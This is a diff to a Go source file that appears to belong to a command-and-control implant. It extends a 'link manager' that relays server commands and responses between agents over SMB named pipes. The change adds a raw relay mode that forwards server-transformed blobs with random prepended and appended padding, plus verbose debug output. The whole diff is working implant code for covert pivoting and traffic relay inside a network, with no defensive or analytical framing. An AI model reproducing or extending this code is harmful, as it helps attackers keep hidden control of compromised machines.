@@ -4,9 +4,9 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	// "log"
 	"net"
 	"sync"
 	"sync/atomic"
@@ -37,6 +37,8 @@ type LinkedAgent struct {
 	Connected    time.Time // When the link was established
 	LastSeen     time.Time // Last successful communication
 	IsActive     bool      // Whether the link is active
+	prependLen   int       // Prepend length for transform reversal (set by last command)
+	appendLen    int       // Append length for transform reversal (set by last command)
 	mu           sync.Mutex
 }
 
@@ -58,14 +60,18 @@ type LinkManager struct {
 
 // LinkDataOut represents data from a linked agent to be forwarded to the server
 type LinkDataOut struct {
-	RoutingID string `json:"r"` // Routing ID
-	Payload   string `json:"p"` // Base64 encoded, encrypted payload
+	RoutingID     string `json:"r"`             // Routing ID
+	Payload       string `json:"p"`             // Base64 encoded payload (or transformed blob)
+	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
+	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
 }
 
 // LinkDataIn represents data from the server destined for a linked agent
 type LinkDataIn struct {
-	RoutingID string `json:"r"` // Routing ID
-	Payload   string `json:"p"` // Base64 encoded payload
+	RoutingID     string `json:"r"`             // Routing ID
+	Payload       string `json:"p"`             // Base64 encoded payload (or transformed blob)
+	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
+	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
 }
 
 var (
@@ -206,7 +212,53 @@ func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
 }
 
 // ForwardToLinkedAgent sends data from the server to a linked agent
+// This is the legacy version that wraps in JSON envelope
 func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) error {
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: routingID=%s, payload_len=%d\n", routingID, len(payload))
+
+	link, exists := lm.GetLink(routingID)
+	if !exists {
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: link not found for routingID=%s\n", routingID)
+		return fmt.Errorf(Err(E4))
+	}
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: found link, IsActive=%v, PipePath=%s\n", link.IsActive, link.PipePath)
+
+	link.mu.Lock()
+	defer link.mu.Unlock()
+
+	if link.Conn == nil || !link.IsActive {
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: link not active or conn nil\n")
+		return fmt.Errorf(Err(E4))
+	}
+
+	// Send the payload over the pipe (legacy JSON envelope format)
+	message := map[string]string{
+		lmKeyType:    lmTypeData,
+		lmKeyPayload: payload,
+	}
+
+	data, err := json.Marshal(message)
+	if err != nil {
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: JSON marshal failed: %v\n", err)
+		return fmt.Errorf(ErrCtx(E18, err.Error()))
+	}
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: writing message, data_len=%d\n", len(data))
+
+	// Write length-prefixed message
+	if err := writeMessage(link.Conn, data); err != nil {
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: writeMessage failed: %v\n", err)
+		link.IsActive = false
+		return fmt.Errorf(ErrCtx(E11, err.Error()))
+	}
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgent: writeMessage succeeded\n")
+
+	link.LastSeen = time.Now()
+	return nil
+}
+
+// ForwardToLinkedAgentRaw sends pre-transformed data to a linked agent
+// Used when transforms are applied by the server - parent just relays raw bytes
+func (lm *LinkManager) ForwardToLinkedAgentRaw(routingID string, payload string, prependLen, appendLen int) error {
 	link, exists := lm.GetLink(routingID)
 	if !exists {
 		return fmt.Errorf(Err(E4))
@@ -219,22 +271,21 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 		return fmt.Errorf(Err(E4))
 	}
 
-	// Send the payload over the pipe
-	message := map[string]string{
-		lmKeyType:    lmTypeData,
-		lmKeyPayload: payload,
-	}
-
-	data, err := json.Marshal(message)
+	// Decode base64 payload - server sent pre-transformed blob
+	rawData, err := base64.StdEncoding.DecodeString(payload)
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	// Write length-prefixed message
-	if err := writeMessage(link.Conn, data); err != nil {
+	// Write raw bytes directly to pipe (no JSON envelope)
+	if err := writeMessage(link.Conn, rawData); err != nil {
 		link.IsActive = false
 		return fmt.Errorf(ErrCtx(E11, err.Error()))
 	}
+
+	// Store padding lengths for this link (needed when reading response)
+	link.prependLen = prependLen
+	link.appendLen = appendLen
 
 	link.LastSeen = time.Now()
 	return nil
@@ -243,6 +294,8 @@ func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string) er
 // ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
 // Returns the response payload or error if timeout occurs
 func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*LinkDataOut, error) {
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgentAndWait: routingID=%s, payload_len=%d, timeout=%v\n", routingID, len(payload), timeout)
+
 	// Create a response channel for this routing ID
 	respChan := make(chan *LinkDataOut, 1)
 
@@ -258,7 +311,43 @@ func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload str
 	}()
 
 	// Forward the command
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgentAndWait: calling ForwardToLinkedAgent\n")
 	if err := lm.ForwardToLinkedAgent(routingID, payload); err != nil {
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgentAndWait: ForwardToLinkedAgent failed: %v\n", err)
+		return nil, err
+	}
+	fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgentAndWait: ForwardToLinkedAgent succeeded, waiting for response\n")
+
+	// Wait for response with timeout
+	select {
+	case response := <-respChan:
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgentAndWait: received response, payload_len=%d\n", len(response.Payload))
+		return response, nil
+	case <-time.After(timeout):
+		fmt.Printf("[DEBUG:HTTPS:LM] ForwardToLinkedAgentAndWait: timeout after %v\n", timeout)
+		return nil, nil // Timeout is not an error - response will come later via normal queue
+	}
+}
+
+// ForwardToLinkedAgentRawAndWait sends raw transformed data to a linked agent and waits for a response
+// Used when transforms are applied by the server - parent just relays raw bytes
+func (lm *LinkManager) ForwardToLinkedAgentRawAndWait(routingID string, payload string, prependLen, appendLen int, timeout time.Duration) (*LinkDataOut, error) {
+	// Create a response channel for this routing ID
+	respChan := make(chan *LinkDataOut, 1)
+
+	lm.responseMu.Lock()
+	lm.responseChannels[routingID] = respChan
+	lm.responseMu.Unlock()
+
+	// Clean up when done
+	defer func() {
+		lm.responseMu.Lock()
+		delete(lm.responseChannels, routingID)
+		lm.responseMu.Unlock()
+	}()
+
+	// Forward the command using raw mode
+	if err := lm.ForwardToLinkedAgentRaw(routingID, payload, prependLen, appendLen); err != nil {
 		return nil, err
 	}
 
@@ -335,82 +424,112 @@ func (lm *LinkManager) GetUnlinkNotifications() []string {
 }
 
 // handleIncomingData reads data from a linked agent and queues it for the server
+// Supports both legacy JSON format and raw transformed format
 func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
+	fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: started for routingID=%s\n", link.RoutingID)
 	defer func() {
+		fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: exiting for routingID=%s\n", link.RoutingID)
 		link.mu.Lock()
 		link.IsActive = false
 		link.mu.Unlock()
-		// log.Printf("[LinkManager] Link handler exited for routing_id: %s", link.RoutingID)
 	}()
 
 	for {
 		// Read length-prefixed message from pipe
+		fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: waiting for message from routingID=%s\n", link.RoutingID)
 		data, err := readMessage(link.Conn)
 		if err != nil {
-			// log.Printf("[LinkManager] Error reading from link %s: %v", link.RoutingID, err)
+			fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: read error from routingID=%s: %v\n", link.RoutingID, err)
 			return
 		}
+		fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: received %d bytes from routingID=%s\n", len(data), link.RoutingID)
 
-		// Parse the message
+		// Try to parse as legacy JSON format first
 		var message map[string]string
-		if err := json.Unmarshal(data, &message); err != nil {
-			// log.Printf("[LinkManager] Invalid message from link %s: %v", link.RoutingID, err)
-			continue
-		}
-
-		switch message[lmKeyType] {
-		case lmTypeData:
-			// Build outbound data
-			outbound := &LinkDataOut{
-				RoutingID: link.RoutingID,
-				Payload:   message[lmKeyPayload],
-			}
-
-			// Check if someone is waiting synchronously for this response
-			lm.responseMu.RLock()
-			respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
-			lm.responseMu.RUnlock()
-
-			if hasSyncWaiter {
-				// Send to synchronous waiter (non-blocking)
-				select {
-				case respChan <- outbound:
-					// log.Printf("[LinkManager] Delivered data from %s to synchronous waiter", link.RoutingID)
-				default:
-					// Channel full or closed, fall back to async queue
-					// log.Printf("[LinkManager] Sync channel full, queuing data from %s", link.RoutingID)
-					lm.queueOutboundData(outbound)
+		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType] != "" {
+			fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: parsed as legacy JSON, type=%s\n", message[lmKeyType])
+			// Successfully parsed as JSON with type field - legacy format
+			switch message[lmKeyType] {
+			case lmTypeData:
+				// Build outbound data
+				outbound := &LinkDataOut{
+					RoutingID: link.RoutingID,
+					Payload:   message[lmKeyPayload],
 				}
-			} else {
-				// No synchronous waiter, queue for normal async processing
-				// log.Printf("[LinkManager] Received data response from link %s, queuing for server", link.RoutingID)
-				lm.queueOutboundData(outbound)
-			}
+				fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: delivering data response, payload_len=%d\n", len(outbound.Payload))
+				lm.deliverOutbound(link, outbound)
 
-		case lmTypeHandshake:
-			// Initial handshake from SMB agent - queue for server
-			outbound := &LinkDataOut{
-				RoutingID: link.RoutingID,
-				Payload:   message[lmKeyPayload],
-			}
-			select {
-			case lm.outboundData <- outbound:
-				// log.Printf("[LinkManager] Queued handshake from %s", link.RoutingID)
+			case lmTypeHandshake:
+				// Initial handshake from SMB agent - queue for server
+				outbound := &LinkDataOut{
+					RoutingID: link.RoutingID,
+					Payload:   message[lmKeyPayload],
+				}
+				fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: queuing handshake, payload_len=%d\n", len(outbound.Payload))
+				select {
+				case lm.outboundData <- outbound:
+					fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: handshake queued successfully\n")
+				default:
+					fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: outbound queue full, dropped handshake\n")
+				}
+
+			case lmTypeDisconn:
+				fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: received disconnect from routingID=%s\n", link.RoutingID)
+				return
+
 			default:
-				// log.Printf("[LinkManager] Outbound queue full, dropping handshake from %s", link.RoutingID)
+				fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: unknown message type: %s\n", message[lmKeyType])
 			}
+		} else {
+			fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: not legacy JSON, treating as raw transformed data\n")
+			// Not valid JSON or no type field - treat as raw transformed data
+			// SMB agent sent pre-transformed blob, just base64 encode and forward
+			link.mu.Lock()
+			prependLen := link.prependLen
+			appendLen := link.appendLen
+			link.mu.Unlock()
 
-		case lmTypeDisconn:
-			// log.Printf("[LinkManager] Received disconnect from %s", link.RoutingID)
-			return
-
-		default:
-			// log.Printf("[LinkManager] Unknown message type from %s: %s", link.RoutingID, message[lmKeyType])
+			outbound := &LinkDataOut{
+				RoutingID:     link.RoutingID,
+				Payload:       base64.StdEncoding.EncodeToString(data),
+				PrependLength: prependLen,
+				AppendLength:  appendLen,
+			}
+			fmt.Printf("[DEBUG:HTTPS:LM] handleIncomingData: delivering raw response, payload_len=%d\n", len(outbound.Payload))
+			lm.deliverOutbound(link, outbound)
 		}
 
 		link.mu.Lock()
 		link.LastSeen = time.Now()
 		link.mu.Unlock()
+	}
+}
+
+// deliverOutbound delivers data to synchronous waiter or queues for async processing
+func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
+	fmt.Printf("[DEBUG:HTTPS:LM] deliverOutbound: routingID=%s, payload_len=%d\n", link.RoutingID, len(outbound.Payload))
+
+	// Check if someone is waiting synchronously for this response
+	lm.responseMu.RLock()
+	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
+	lm.responseMu.RUnlock()
+
+	fmt.Printf("[DEBUG:HTTPS:LM] deliverOutbound: hasSyncWaiter=%v\n", hasSyncWaiter)
+
+	if hasSyncWaiter {
+		// Send to synchronous waiter (non-blocking)
+		select {
+		case respChan <- outbound:
+			fmt.Printf("[DEBUG:HTTPS:LM] deliverOutbound: delivered to synchronous waiter\n")
+		default:
+			// Channel full or closed, fall back to async queue
+			fmt.Printf("[DEBUG:HTTPS:LM] deliverOutbound: sync channel full, queuing\n")
+			lm.queueOutboundData(outbound)
+		}
+	} else {
+		// No synchronous waiter, queue for normal async processing
+		fmt.Printf("[DEBUG:HTTPS:LM] deliverOutbound: no sync waiter, queuing for async\n")
+		lm.queueOutboundData(outbound)
 	}
 }
 
